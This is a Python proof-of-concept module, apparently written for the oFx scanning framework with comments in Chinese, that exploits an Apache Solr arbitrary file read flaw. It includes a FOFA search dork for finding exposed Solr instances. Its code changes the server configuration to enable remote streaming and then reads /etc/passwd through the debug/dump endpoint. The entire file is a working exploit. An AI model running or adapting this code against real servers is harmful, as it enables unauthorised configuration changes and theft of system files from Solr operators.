# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3

import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache Solr 任意文件读取漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache Solr",                     # 漏洞应用名称
        "AppVersion" : "Apache Solr <= 8.8.1",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。
            用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；
            也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。

            Apache-Solr任意文件读取漏洞漏洞，攻击者可以在未授权的情况下读取目标服务器敏感文件和相关内容。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="Solr Admin"
            app="Apache-Solr" || app="Solr"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        # core_name = ""

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        headers1 = {
                    "Content-type":"application/json"
                    }
        
        url0 = self.target + "/solr/admin/cores?indexInfo=false&wt=json" # url自己按需调整
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0, proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "{\"responseHeader\":{\"status\":0,\"QTime\":0},\"initFailures\":{},\"status\":{}}" in req0.text:
                pass
            else:
                core_name = list(json.loads(req0.text)["status"])[0]

                url1 = self.target + "/solr/" + core_name + "/config"
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                data1 = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
                req1 = requests.post(url=url1, data=data1,proxies = self.proxy , headers=headers1, verify=False, timeout= self.timeout)

                if "This" in req1.text and req1.status_code == 200:
                    url2 = self.target + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
                    data2 = 'stream.url=file:///etc/passwd'
                    headers2 = {
                                "Content-Type": "application/x-www-form-urlencoded"
                                }
                    req2 = requests.post(url2,headers = headers2, data = data2,proxies = self.proxy ,timeout = self.timeout,verify = False)
                    if "No such file or directory" in req2.text:#req.status_code == 200 and :
                        # vuln = [False,req.text]
                        pass 
                    else:
                        if "root:/root" in json.loads(req2.text)["streams"][0]["stream"]:
                            vuln = [True,json.loads(req2.text)["streams"][0]["stream"]]
                        else:
                            pass
                else:
                    pass
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()